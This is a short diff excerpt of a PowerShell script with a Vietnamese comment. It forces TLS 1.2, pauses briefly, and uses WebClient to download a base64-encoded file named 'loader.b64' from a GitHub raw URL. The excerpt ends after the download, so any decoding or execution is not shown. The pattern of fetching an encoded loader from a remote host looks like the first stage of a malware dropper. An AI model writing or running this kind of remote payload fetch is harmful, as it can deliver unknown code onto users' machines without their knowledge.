@@ -3,6 +3,7 @@
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 Start-Sleep -Milliseconds 500
+
 # Dùng WebClient thay vì Invoke-WebRequest
 $wc = New-Object System.Net.WebClient
 $base64_str = $wc.DownloadString("https://raw.githubusercontent.com/0xKaiser/test/0xKaiser-patch-1/loader.b64")
